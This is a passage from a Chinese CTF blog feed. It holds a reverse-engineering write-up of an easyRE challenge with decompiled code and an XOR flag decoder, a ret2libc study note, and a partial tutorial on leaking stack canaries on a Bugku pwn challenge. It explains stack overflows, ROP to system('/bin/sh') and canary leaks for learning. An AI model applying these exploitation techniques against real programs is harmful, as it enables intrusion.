<span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到这个函数之后就是以这个为主去分析了，由于这个函数特别不友好，我们得去看看这个函数调用的其它那么多sub函数有没有我们认识的熟悉的函数。其实第一点很容易可以看出<code>sub_410CC00</code>非常像输出一句话，也就是<code>puts</code>函数，当然把它理解为<code>printf</code>也没有关系，不影响。根据代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br></pre></td></tr></table></figure><p>函数参数为字符指针，返回一个数值，是不是像极了strlen函数？</p><p><code>sub_4406E0(0LL, v15, 37LL);</code>这个函数，第一个参数0，第二个参数，字符指针，第三个参数一个整型变量，其实也不难判断出是<code>read</code>函数，这个靠自己积累多了，看道这种形式就知道是这个函数。这么讲有些人可能懵懵的，那我这么说，<code>sub_4105A6(&quot;%d%d&quot;,&amp;v1,&amp;v2)</code>是什么函数？你会很快看出这就是一个<code>scanf</code>，除了<code>scanf</code>还有哪个函数写得出这种形式啊？喏，道理一样的。那么我们把那些函数重命名回去看看整体观感好了不少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)<span class="built_in">strlen</span>(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你会突然自言自语，”这两个是一个函数？“，不要慌，小场面，小场面。那么这么之后就看看主要的内容，首先一个<code>for</code>循环映入眼帘，发现我们输入的<code>v15[i]^i</code>如果不等于<code>v12[i]</code>那么就会直接跳到最后一行结束程序，那么我们肯定要看看不让它跳转的输入语句是个什么。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line"></span><br><span class="line">char v12[13]; // [rsp+60h] [rbp-C0h] BYREF</span><br><span class="line">char v13[4]; // [rsp+6Dh] [rbp-B3h] BYREF</span><br><span class="line">char v14[19]; // [rsp+71h] [rbp-AFh] BYREF</span><br><span class="line">char v15[32]; // [rsp+90h] [rbp-90h] BYREF</span><br></pre></td></tr></table></figure><p>这个事实上是按照栈的顺序排列的，也就是说<code>v12</code>在靠近栈顶的地方，<code>v15</code>在靠近栈底的地方。</p><p>那么<code>v15</code>看着没有<code>37</code>的大小，把它溢出一下用用别人的不就好了嘛，别人反正在我用的时候它也不用，然后那些<code>v12,v13,v14</code>都可以看成首尾相连的，因为它们的栈地址本来就挨着的。然后那些都是有赋初值的，那么我们写一个脚本跑一下看看这串字符是什么。</p><p><img src="https://i.loli.net/2021/05/06/5aroWkuvRVFHA9C.png" alt="buuoj 红帽杯2019 easyRE_2.png"></p><p>它告诉你了一串信息：前四个字符是<code>flag</code>你花了这么久时间破解出来的一串字符，它肯定有用，先留着，后面分析肯定要用。</p><p>然后第二个引入眼帘的就是10个一模一样的函数了，点进去发现它引用了base64的那张表，而且很明显看见3,4之类在base64加密解密很常见的数字，那么不用细看了，肯定base64解密。然后看看发现读入了40个字符，然后后面还有一个函数<code>!(unsigned int)sub_400360(v11, off_6CC090)</code>稍微再熟悉点就会发现肯定是<code>strcmp</code>函数，常用格式嘛<code>if(!strcmp)</code>，那么就是它解密了10次变成长度39的字符串，这里真的不用考虑这个函数是加密的情况，总不可能加密了，这个长度才40，算一算也很清楚。那么如果是解密的话，原字符串长度大概在710长度左右，公式：<code>40*((4/3)**10)</code>算得的。这么长的字符串，刚刚那个第一个就是，大概长度就是710，很符合我们的需求，写exp对它10次base64解密得到一个<a href="https://bbs.pediy.com/thread-254172.htm">网址</a>，然后你就发现自己被骗了，那里没有<code>flag</code>，然后就会发现这里没什么地方可以分析了。</p><p>然后你可以看到刚刚那一串很长的字符串上面还有一串字符串。</p><p><img src="https://i.loli.net/2021/05/06/TdMyJQIqXgPu1WF.png" alt="buuoj 红帽杯2019 easyRE_3.png"></p><p>一路跟踪它发现来到了另一个函数<code>sub_400D35</code>可以很明显看到<code>102</code>,<code>103</code>它们分别是<code>f</code>,<code>g</code>的ascii码值，并且刚好下标在0和3，那么回想前面给的信息，直接断定这个字符串是<code>flag</code>。</p><p><img src="https://i.loli.net/2021/05/06/ieT7YQB9vgjkn2z.png" alt="buuoj 红帽杯2019 easyRE_4.png"></p><p>然后后面对这个字符串动手动脚的，那么找到了长度为25的一个字符串，根据它的加密规则：每四位轮换<code>v2[4]</code>对它异或运算。甭管<code>v2</code>是啥，它和这个字符开头异或肯定是<code>flag</code>这个是铁的道理，因为前面破解出了一个提示。</p><p>那么咱们写脚本解一下这串字符。直接得到<code>flag</code></p><p><img src="https://i.loli.net/2021/05/06/rVxmMbHEOuZATvW.png" alt="buuoj 红帽杯2019 easyRE_5.png"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[]=&#123;<span class="number">0x40</span>,<span class="number">0x35</span>,<span class="number">0x20</span>,<span class="number">0x56</span>,<span class="number">0x5D</span>,<span class="number">0x18</span>,<span class="number">0x22</span>,<span class="number">0x45</span>,<span class="number">0x17</span>,<span class="number">0x2F</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,<span class="number">0x3C</span>,<span class="number">0x27</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x6C</span>,<span class="number">0x24</span>,<span class="number">0x6E</span>,<span class="number">0x72</span>,<span class="number">0x3C</span>,<span class="number">0x32</span>,<span class="number">0x45</span>,<span class="number">0x5b</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">string</span> key=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">key[i]^=s[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(s);i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[i]^key[i%<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;pwn&lt;/code&gt;题做完&lt;code&gt;re&lt;/code&gt;题当然也不能少，&lt;code&gt;buu&lt;/code&gt;上除了那些水题，开始做一些带点技术含量的题目了。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2libc学习报告</title>
    <link href="http://example.com/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
    <id>http://example.com/2021/05/01/ret2libc%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</id>
    <published>2021-05-01T02:00:00.000Z</published>
    <updated>2021-10-25T04:37:24.493Z</updated>
    
    <content type="html"><![CDATA[<p>在做<code>pwn</code>题的时候，我们会想尽一切办法执行函数<code>system(&quot;/bin/sh&quot;)</code>，那么执行这个需要两点：</p><p>1.找到<code>system()</code>函数。</p><p>2.找到<code>&quot;/bin/sh&quot;</code>字符串。</p><span id="more"></span><h2 id="level0-have-everything"><a href="#level0-have-everything" class="headerlink" title="level0:have everything"></a>level0:have everything</h2><p>这个情况在简单比赛的签到题估计都出不了了，在溢出点写上<code>system()</code>的地址，若是32位则隔四字节往后填充<code>&quot;/bin/sh&quot;</code>字符串就行了。如果是64位的那么找到<code>pop %rdi ret</code>的<code>gadgets</code>在返回地址填上，并且后面堆上<code>&quot;/bin/sh&quot;</code>的地址和<code>system()</code>的地址即可成功</p><h2 id="level1-without-“bin-sh”"><a href="#level1-without-“bin-sh”" class="headerlink" title="level1:without “bin/sh”"></a>level1:without “bin/sh”</h2><p>在一个地方写上<code>&quot;bin/sh&quot;</code>然后溢出的时候传参就行了。如果没开启<code>ASLR</code>那么可以直接往栈上写，如果开了那你只能往<code>.bss</code>段去写，其实写好后跟<code>level0</code>差不多,也不多赘述。</p><h2 id="level9999-have-nothing"><a href="#level9999-have-nothing" class="headerlink" title="level9999:have nothing"></a>level9999:have nothing</h2><p>哇，这个难度我觉得真的是上升了不少档次，所以给个<code>9999</code>级我觉得不过分。</p><p>啥都没有的情况就要往<code>libc</code>里面去找<code>system()</code>函数了，<code>libc</code>的所有函数之间的偏移都是固定的，确定了一个函数相当于确定了<code>libc</code>中所有的函数的地址。然后就是困扰了我一整天的东西了：<code>plt</code>表和<code>got</code>表，这两个表是什么愣是看了很久，因为感觉按照自己的逻辑完全没必要弄这么两张表的。</p><p>先看看专业解释的<code>plt</code>和<code>got</code>：</p><p><code>plt(procedure linkage table)</code>程序联动表:</p><p>当程序执行的时候在这个表里执行搜寻系统函数地址的代码。首次执行系统函数时，搜寻获取真实地址,其后再执行该函数时直接从GOT中获取真实地址。</p><p><code>got(global offset table):</code>全局偏移表:</p><p>在还没有获取到地址的时候，默认返回<code>plt</code>表调用<code>dl_runtime_resolve</code>函数寻找libc函数的地址。</p><p>其实我到现在都还不敢肯定我讲的对不对，但是我也要敢于说出来，让别人看到，如果你看到我的观点认为有很大问题的，欢迎你跟我联系，将感激不尽。</p><p>以下为我目前认为的观点：</p><p>程序在运行的时候加载<code>libc</code>，只有一个能确定：那就是偏移，但是基址是不确定的，因此我之前的疑惑：如果知道偏移那何不直接把地址写在<code>got</code>表里面就解开了。第一次运行的时候要去寻找基址，然后才能加上偏移写在<code>got</code>表中，就可以很方便地直接调用了。那么可能又会有疑问：为什么我每一次运行的地址都确定的？那是因为我们nc的远程服务器它只运行了这一个程序，也就是只有这一个程序调用了<code>libc</code>，所以每一次运行的时候当然确定的，当然前提是这个文件没有开启<code>ASLR</code>。</p><p>以上只是自己在搜集了这么多师傅的资料后能得到的自己认为正确的观点，真的很大概率错的。</p><p>如果got表没有装载<code>system</code>函数那么我们就要自己寻找<code>system</code>函数的地址了。我们先列出一些公式，我设<code>libc</code>里面有一函数<code>aaa()</code>，那么可以得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa=libc_base+aaa_offset</span><br><span class="line">system=libc_base+system_offset</span><br></pre></td></tr></table></figure><p>因为所有函数偏移都已知，所以得到一个函数的地址即得到所有函数的地址。一般我们可以通过输出函数来泄露这个函数的地址，泄露成功就能<code>getshell</code></p><p>(PS:学是五天前学的，到现在还是没学会qwq)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在做&lt;code&gt;pwn&lt;/code&gt;题的时候，我们会想尽一切办法执行函数&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;，那么执行这个需要两点：&lt;/p&gt;
&lt;p&gt;1.找到&lt;code&gt;system()&lt;/code&gt;函数。&lt;/p&gt;
&lt;p&gt;2.找到&lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt;字符串。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>canary保护学习报告:通过字符串泄露canary</title>
    <link href="http://example.com/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/"/>
    <id>http://example.com/2021/05/01/%E7%BB%95%E8%BF%87canary%E4%BF%9D%E6%8A%A4/</id>
    <published>2021-05-01T02:00:00.000Z</published>
    <updated>2021-10-24T14:25:34.811Z</updated>
    
    <content type="html"><![CDATA[<p>这几天一直在跟着团队的进度做<code>csapp</code>的实验报告，突然想拿题来练手了才发现自己还是有点菜的。这次的任务是做一道简简单单的带<code>canary</code>保护的一题，做了很长时间问了很多师傅，也算把这个方法搞搞明白了，但是不确定能不能完全说的明白，那么下面就开始吧。</p><span id="more"></span><h1 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h1><p><code>canary</code>就是一段简简单单的cookie，它一般在上个函数所保存的<code>ebp</code>之前(即靠近栈顶的那个方向)下面一个图能描述一个带<code>canary</code>保护的栈帧，应该还是比较清楚的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">↑栈顶</span><br><span class="line">buf//函数的缓冲区，一般用于保存局部变量</span><br><span class="line">canary</span><br><span class="line">ebp//上一个函数保存的ebp</span><br><span class="line">eip//返回地址</span><br><span class="line">argument 1</span><br><span class="line">argument 2</span><br><span class="line">argument 3</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">↓栈底</span><br></pre></td></tr></table></figure><p>如果企图用大量数据覆盖缓冲区并且修改返回地址的数据达到劫持<code>eip</code>的目的那么就会修改<code>canary</code>的值，那么在返回的时候检测到<code>canary</code>的值发生改变后就会直接抛出异常并且停止执行程序。并且每次<code>canary</code>的值都是随机的，普通方法几乎是突破不了的。但是我们可以先想办法泄露<code>canary</code>的值，然后再把<code>canary</code>插入到<code>payload</code>当中，这样的话，就算我溢出了，但是并没有修改<code>canary</code>的值，也就没办法检测到我有没有栈溢出了。在64位的程序当中，<code>canary</code>就是一个七字节的数据带一个<code>\x00</code>字节，并且<code>\x00</code>字节在最低位。</p><p>那么回想一下字符串是什么？字符串就是一串连着的字节序，不管它原本在这个地方的定义是什么，我说它是字符串，他就可以是字符串，因为计算机它不管是存什么数据它终归也只是0和1的组成。例如<code>0x61626364</code>它看上去好像是一个<code>int</code>型变量，但是它储存也只是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64 63 62 61</span><br></pre></td></tr></table></figure><p>如果我把它看成字符串那也没错，它可以代表字符串<code>dcba</code>，它们存储的数据是一模一样的。但是有一个问题：计算机里基本上都是又很多字节连在一起，那如果后面还有很多数据，怎么样才能只表示字符串<code>dcba</code>呢？那就需要一个特殊字节<code>\x00</code>了，识别字符串会从一个字符指针开始，然后依次增大指针的值，只要指针所指向的地址不是<code>\x00</code>字节，那么它就可以是这个字符串中的一员。那如果我输入一个字符串，溢出了但没完全溢出呢？我们把字符串填充地恰到好处，刚好紧挨着<code>canary</code>，那么在之后如果<code>printf</code>这个字符串的话，就会把<code>canary</code>一起输出出来，我们就获取了<code>canary</code>。但是注意，canary最后一个字节是<code>\x00</code>，不会被接受，因此在获取canary的时候注意末尾加上<code>\x00</code>字节。</p><p>下面来看道例题：</p><h2 id="Bugku-Pwn4"><a href="#Bugku-Pwn4" class="headerlink" title="Bugku - Pwn4"></a>Bugku - Pwn4</h2><p>下载文件照例拖进虚拟机<code>checksec</code>检查一下各种保护</p><p><img src="https://i.loli.net/2021/05/01/XSkKpCyAZN1uslE.png" alt="Bugku_pwn4_1.png"></p><p>发现只开启了<code>canary</code>和堆栈不可执行的保护，堆栈不可执行那么就不能注入代码，一般就直接<code>rop</code>攻击，这没什么好讲的。拖进<code>IDA-F5</code>主函数看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+10h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">520</span>]; <span class="comment">// [rsp+40h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+248h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Welcome!\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please leave your name(Within 36 Length):&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, buf);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please leave a message(Within 0x200 Length):&quot;</span>, <span class="number">0x2C</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, v5, <span class="number">0x300</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your message is :%s \nBye~&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里执行了两次<code>read()</code>函数，并且读取的大小远远超过缓冲区开辟的大小，基本上可以说无限制吧。然后第一次<code>read</code>之后还有一次<code>printf()</code>输出，那很明显，第一次就让你泄露canary，第二次就去执行<code>shell</code>函数，如果不确定缓冲区的大小，那么可以双击buf变量看看和离本函数<code>rbp</code>的相对偏移。</p><p><img src="https://i.loli.net/2021/05/01/uPz4Uq21LEdsOvF.png" 